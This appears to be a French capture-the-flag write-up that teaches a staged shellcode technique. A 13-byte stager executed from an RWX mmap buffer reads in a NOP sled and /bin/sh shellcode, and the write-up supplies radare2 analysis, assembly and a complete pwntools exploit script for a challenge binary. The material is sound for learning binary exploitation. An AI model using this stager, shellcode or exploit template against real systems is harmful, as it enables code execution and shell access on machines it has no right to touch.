# Staged Shellcode — Stager + mmap exécutable

## Table des matières
- [Prérequis](#prérequis)
- [Concepts clés](#concepts-clés)
- [Analyser le binaire](#analyser-le-binaire)
- [Étape 1 — Comprendre les contraintes](#étape-1--comprendre-les-contraintes)
- [Étape 2 — Construire le stager (stage1)](#étape-2--construire-le-stager-stage1)
- [Étape 3 — Construire le payload final (stage2)](#étape-3--construire-le-payload-final-stage2)
- [Étape 4 — Exploitation complète](#étape-4--exploitation-complète)
- [Schéma récapitulatif](#schéma-récapitulatif)
- [Erreurs fréquentes](#erreurs-fréquentes)
- [Résumé des commandes utiles](#résumé-des-commandes-utiles)

---

## Prérequis

- Connaître les bases de l'assembleur x86/x64
- Comprendre ce qu'est un syscall Linux
- Connaître les conventions d'appel x64 (registres rdi, rsi, rdx...)
- Avoir `pwntools` installé (`pip install pwntools`)
- Avoir `radare2` installé pour l'analyse statique

---

## Concepts clés

### mmap et zones exécutables

`mmap` est un appel système qui alloue une zone mémoire avec des permissions configurables. Ici le programme l'appelle avec `prot=7` :

```c
firmware = mmap(NULL, 0x1000,
    PROT_READ | PROT_WRITE | PROT_EXEC,  // prot = 1+2+4 = 7
    MAP_ANONYMOUS | MAP_PRIVATE,
    -1, 0);
```

Ce qui donne une zone de **4096 octets** qui est à la fois lisible, modifiable **et exécutable**. C'est cette zone qui stocke le firmware.

> **Note :** NX (No eXecute) est activé sur ce binaire — la pile n'est pas exécutable. Mais `mmap` avec `PROT_EXEC` crée explicitement une zone exécutable, ce qui **contourne NX** complètement. Ce n'est pas un exploit de NX, c'est le programme lui-même qui crée la zone.

### Le principe du Stager

Un **stager** c'est un tout petit bout de code dont le seul rôle est de **charger un payload plus grand**. On l'utilise quand on a une contrainte de taille :

```
SANS stager (impossible ici)         AVEC stager
─────────────────────────────        ──────────────────────────────
upload(shellcode_complet)            upload(stage1 = 13 octets)
→ trop grand, refusé                 → tient dans la limite
                                     execute(stage1)
                                     → stage1 appelle read()
                                     → on envoie stage2 sans limite
                                     → shell !
```

### Les syscalls Linux x64

Un syscall c'est une façon d'appeler directement le noyau Linux sans passer par la libc. Les arguments suivent la convention :

| Registre | Rôle |
|---|---|
| `rax` | numéro du syscall |
| `rdi` | argument 1 |
| `rsi` | argument 2 |
| `rdx` | argument 3 |

Le syscall `read` (numéro 0) s'appelle ainsi :

```asm
xor eax, eax      ; rax = 0 = read
xor edi, edi      ; rdi = 0 = stdin
mov rsi, buf      ; rsi = adresse destination
mov edx, 0x1000   ; rdx = nombre d'octets à lire
syscall
```

---

## Analyser le binaire

### Avec radare2

```bash
r2 ./chall
aaa
afl
pdf @ sym.main
pdf @ sym.upload_update
pdf @ sym.apply_update
```

### Vérifier les protections

```bash
checksec --file=./chall
```

| Protection | Valeur | Impact |
|---|---|---|
| **NX enabled** | Oui | La pile n'est pas exécutable — sans impact ici car mmap crée une zone exécutable |
| **PIE enabled** | Oui | Adresses aléatoires — sans impact ici car on n'a pas besoin d'adresses fixes |
| **No canary** | Absent | Pas de protection de pile |
| **Partial RELRO** | Partiel | La GOT est partiellement protégée |

### Ce qu'on cherche dans main

```asm
mov qword [var_8h], 0xd    ← firmware_max_size = 13 octets !
mov edx, 7                 ← prot = PROT_READ|PROT_WRITE|PROT_EXEC
mov esi, 0x1000            ← taille mmap = 4096 octets
call sym.imp.mmap          ← zone exécutable allouée
```

### Ce qu'on cherche dans upload_update

```asm
args(rdi, rsi)             ← rdi = firmware_max_size, rsi = firmware
mov rdx, qword [nbyte]     ← rdx = firmware_max_size (13 octets)
mov rsi, qword [buf]       ← rsi = adresse firmware
mov edi, 0                 ← stdin
call sym.imp.read          ← read(0, firmware, 13)
```

### Ce qu'on cherche dans apply_update

```asm
args(rdi)                  ← rdi = firmware (adresse de la zone mmap)
mov qword [var_8h], rdi    ← sauvegarde sur la pile
mov rdx, qword [var_8h]    ← rdx = firmware (copie de rdi)
call rdx                   ← exécute le code dans firmware
```

> ⚠️ **Étape critique avant d'écrire stage1 — toujours vérifier `args(...)` dans r2 !**
>
> La ligne `args(rdi)` confirme que `firmware` arrive dans `rdi` en entrée de fonction. En regardant ensuite le corps de la fonction, **aucune instruction ne modifie `rdi`** entre le prologue et le `call rdx`. On peut donc affirmer avec certitude que `rdi = firmware` au moment où stage1 s'exécute.
>
> Si `args(rdi)` avait montré `args(rdi, rsi)` avec `rdi` écrasé entre temps, il aurait fallu utiliser un autre registre. **C'est cette analyse qui dicte la première instruction de stage1** — ici `push rdi / pop rsi`. Sans cette vérification, stage1 pourrait lire une adresse invalide et le programme crasherait silencieusement.

---

## Étape 1 — Comprendre les contraintes

### La limite de 13 octets

```c
long firmware_max_size = 0xd;   // 0xd = 13 en décimal
```

Vérifié dans le désassemblage de main :
```asm
mov qword [var_8h], 0xd    ← hardcodé dans main
```

Un shellcode `/bin/sh` standard fait environ 40-50 octets. On ne peut donc pas l'envoyer directement.

### La zone mmap : une opportunité

```asm
mov edx, 7         ← PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4) = 7
mov esi, 0x1000    ← 4096 octets disponibles
call mmap
```

La zone `firmware` peut contenir 4096 octets et est exécutable — on peut y écrire autant de shellcode qu'on veut si on trouve un moyen de contourner la limite de 13 octets.

### L'idée : utiliser stage1 pour appeler read()

Si on peut faire exécuter un `read(0, firmware, 0x1000)` depuis l'intérieur de `firmware`, on pourra ensuite envoyer autant d'octets qu'on veut — sans passer par `upload_update` et sa limite.

---

## Étape 2 — Construire le stager (stage1)

### Objectif

Écrire le syscall `read(0, firmware, 0x1000)` en **13 octets maximum**.

### Exploitation de rdi

Quand `apply_update` appelle `firmware` via `call rdx`, `rdi` pointe encore vers `firmware`. On peut donc s'en servir gratuitement comme adresse de destination du `read` :

```asm
push rdi        ; sauvegarde rdi (= adresse firmware) sur la pile
pop rsi         ; rsi = adresse firmware  → destination du read
mov edx, 0x1000 ; rdx = 4096             → taille max à lire
xor edi, edi    ; rdi = 0                → stdin
xor eax, eax    ; rax = 0                → syscall read
syscall         ; read(0, firmware, 0x1000)
```

### Vérification de la taille

```python
stage1 = asm("""
    push rdi
    pop rsi
    mov edx, 0x1000
    xor edi, edi
    xor eax, eax
    syscall
""", arch="amd64")

print(f"Taille stage1 : {len(stage1)} octets")   # doit être <= 13
```

```
push rdi     → 1 octet  (0x57)
pop rsi      → 1 octet  (0x5e)
mov edx,...  → 5 octets (0xba 00 10 00 00)
xor edi, edi → 2 octets (0x31 ff)
xor eax, eax → 2 octets (0x31 c0)
syscall      → 2 octets (0x0f 05)
             = 13 octets pile poil ✓
```

---

## Étape 3 — Construire le payload final (stage2)

### Le shellcode /bin/sh

Pwntools génère automatiquement un shellcode `execve("/bin/sh", NULL, NULL)` :

```python
shellcode = shellcraft.amd64.linux.sh()
shellcode = asm(shellcode, arch="amd64")
```

### Le NOP sled

On préfixe le shellcode avec des NOPs (`\x90`) pour absorber d'éventuelles imprécisions sur le point d'entrée :

```python
sled   = b"\x90" * 23
stage2 = flat(sled, shellcode)
```

> **Pourquoi 23 ?** Stage1 fait 13 octets. Quand stage2 écrase firmware depuis le début, les 13 premiers octets de stage2 vont **écraser stage1 en cours d'exécution**. Le NOP sled garantit qu'après le `syscall` de stage1, l'exécution tombe dans du NOP avant d'atteindre le shellcode.

```
firmware après stage2 :
┌─────────────────────────────────┐
│ \x90 × 23  (NOP sled)           │ ← les 13 premiers octets écrasent stage1
│ shellcode /bin/sh               │ ← le vrai payload
└─────────────────────────────────┘
                ↑
    stage1 finit son syscall ici
    et glisse jusqu'au shellcode
```

---

## Étape 4 — Exploitation complète

### Déroulé de l'attaque

```
option 1 → upload_update(13, firmware)
         → read(stdin, firmware, 13)
         → on envoie stage1 (13 octets)
         → firmware contient maintenant stage1

option 2 → apply_update(firmware)
         → call rdx  (rdx = rdi = firmware)
         → stage1 s'exécute :
              read(0, firmware, 0x1000)  ← attend une entrée stdin

option 2 (toujours en attente) → on envoie stage2
         → stage2 s'écrit dans firmware depuis le début
         → le syscall read() se termine
         → exécution continue dans firmware = NOP sled → shellcode
         → shell !
```

### Template d'exploit complet

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or "chall")
context.encoding = "utf-8"

host = "challenges.exemple.fr"
port = 12345

def start():
    if args.LOCAL:
        return process([exe.path])
    return remote(host, port)

# ── Construction des stages ──────────────────────────────────

# Stage 1 : stager de 13 octets
# rdi pointe vers firmware au moment de l'exécution (confirmé par r2)
stage1 = asm("""
    push rdi        ; rdi = adresse firmware → destination du read
    pop rsi
    mov edx, 0x1000 ; lire jusqu'à 4096 octets
    xor edi, edi    ; stdin
    xor eax, eax    ; syscall read = 0
    syscall
""", arch="amd64")

assert len(stage1) <= 13, f"stage1 trop grand : {len(stage1)} octets !"
log.info(f"stage1 : {len(stage1)} octets")

# Stage 2 : NOP sled + shellcode complet
shellcode = asm(shellcraft.amd64.linux.sh(), arch="amd64")
sled      = b"\x90" * 23
stage2    = flat(sled, shellcode)
log.info(f"stage2 : {len(stage2)} octets")

# ── Exploit ──────────────────────────────────────────────────
io = start()

# Upload du stager
io.sendlineafter(b">", b"1")
io.sendlineafter(b"Ready to receive update > ", stage1)
log.success("Stage1 uploadé")

# Exécution du stager → déclenche read() interne
io.sendlineafter(b">", b"2")

# Le stager attend maintenant sur read() → on envoie le vrai shellcode
io.send(stage2)
log.success("Stage2 envoyé")

io.interactive()   # shell !
```

---

## Schéma récapitulatif

```
MÉMOIRE (zone firmware mmap, 4096 octets, RWX)

APRÈS upload stage1 :
┌─────────────────────────────────┐
│ push rdi                        │
│ pop rsi                         │  ← 13 octets de stager
│ mov edx, 0x1000                 │
│ xor edi, edi                    │
│ xor eax, eax                    │
│ syscall  ←──── exécution ici    │
│ (vide)                          │
└─────────────────────────────────┘

PENDANT l'exécution de stage1 :
stage1 appelle read(0, firmware, 0x1000)
→ le programme bloque, attend stdin
→ on envoie stage2

APRÈS réception de stage2 :
┌─────────────────────────────────┐
│ \x90 \x90 \x90 ... (23 NOPs)   │ ← écrase stage1 + zone de sécurité
│ shellcode execve(/bin/sh)       │ ← le vrai payload
│ ...                             │
└─────────────────────────────────┘
stage1 termine son syscall → glisse dans les NOPs → shell !

FLUX D'ATTAQUE
1. option 1 → upload stage1 (13 octets) dans firmware
2. option 2 → exécute stage1 → déclenche read() interne
3. envoi stage2 → écrase firmware → shell
```

---

## Erreurs fréquentes

### stage1 fait plus de 13 octets
→ Vérifier avec `len(stage1)`. Si trop grand, chercher des instructions plus courtes. Par exemple `xor eax, eax` (2 octets) plutôt que `mov eax, 0` (5 octets).

### Le shell s'ouvre mais se ferme immédiatement
→ Utiliser `io.interactive()` et non `io.stream()` — `interactive()` maintient la connexion bidirectionnelle ouverte.

### stage2 n'est pas exécuté
→ Vérifier que `io.send(stage2)` est bien envoyé **pendant** que stage1 tourne (après `io.sendlineafter(b">", b"2")`). Ne pas utiliser `sendline` qui ajoute un `\n` parasite.

### "Invalid choice" en boucle
→ Le programme utilise `scanf("%d")` pour lire le choix. Envoyer `b"1"` et non `b"1\n"` peut poser problème selon le buffering — `sendlineafter` gère ça automatiquement.

### PIE activé — les adresses changent
→ Sans impact ici car on n'utilise aucune adresse du binaire. Le shellcode tourne entièrement dans la zone `mmap` dont l'adresse est passée via `rdi`.

---

## Résumé des commandes utiles

```bash
# Analyse statique
r2 ./chall
aaa
afl
pdf @ sym.main          # trouver firmware_max_size et les flags mmap
pdf @ sym.upload_update # confirmer la limite de read()
pdf @ sym.apply_update  # CRUCIAL : vérifier args(...) pour savoir quel registre
                        # pointe vers firmware au moment de l'appel
                        # → c'est ce qui dicte la première instruction de stage1

# Dans le désassemblage de apply_update, chercher :
# args(rdi)      → firmware est dans rdi au moment de l'appel
# args(rdi, rsi) → firmware pourrait être dans rdi ou rsi selon le contexte
# Puis vérifier qu'aucune instruction entre le prologue et "call rdx/rax"
# ne modifie ce registre — sinon il faut en choisir un autre pour stage1

# Vérifier les protections
checksec --file=./chall

# Vérifier la taille d'un shellcode assemblé
python3 -c "
from pwn import *
s = asm('push rdi\npop rsi\nmov edx,0x1000\nxor edi,edi\nxor eax,eax\nsyscall', arch='amd64')
print(f'{len(s)} octets : {s.hex()}')
"

# Debug de l'exploit
./exploit.py LOCAL DEBUG    # logs détaillés
./exploit.py LOCAL GDB      # attache GDB au démarrage
```

---

*Technique : Staged Shellcode — Stager 13 octets + mmap RWX*
*Architecture cible : x86-64 (amd64)*
*Outils : pwntools, radare2*
